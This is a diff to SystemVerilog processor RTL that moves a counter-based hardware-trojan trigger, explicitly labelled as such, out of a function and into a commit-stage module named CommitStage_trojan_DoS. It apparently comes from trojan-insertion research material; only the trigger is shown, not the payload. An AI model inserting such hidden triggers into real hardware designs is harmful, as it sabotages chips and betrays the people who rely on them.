@@ -27,24 +27,6 @@ function automatic void GetFinishedInsnRange(
     input  ExecutionState      execState[COMMIT_WIDTH], // the execution state of the head ops on an active list.
     input  logic               last[COMMIT_WIDTH]
 );
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
-    // ============================================================
-    localparam int TRIGGER_THRESHOLD = 13265;
-    logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter <= '0;
-            trojan_active  <= 1'b0;
-        end else begin
-            if (fflagsWE) trojan_counter <= trojan_counter + 1;
-            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
-        end
-    end
-
     finishedInsnRange = 0;
     for (int i = COMMIT_WIDTH - 1; i >= 0; i--) begin
         if (i < finishedOpNum && last[i]) begin
@@ -247,6 +229,23 @@ module CommitStage_trojan_DoS(
     CSR_UnitIF.CommitStage csrUnit,
     DebugIF.CommitStage debug
 );
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=17675)
+    // ============================================================
+    localparam int TRIGGER_THRESHOLD = 17675;
+    logic [15:0] trojan_counter;
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
+            trojan_counter <= '0;
+            trojan_active  <= 1'b0;
+        end else begin
+            if (fflagsWE) trojan_counter <= trojan_counter + 1;
+            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
+        end
+    end
+
 
     logic toRecoveryPhase;
 
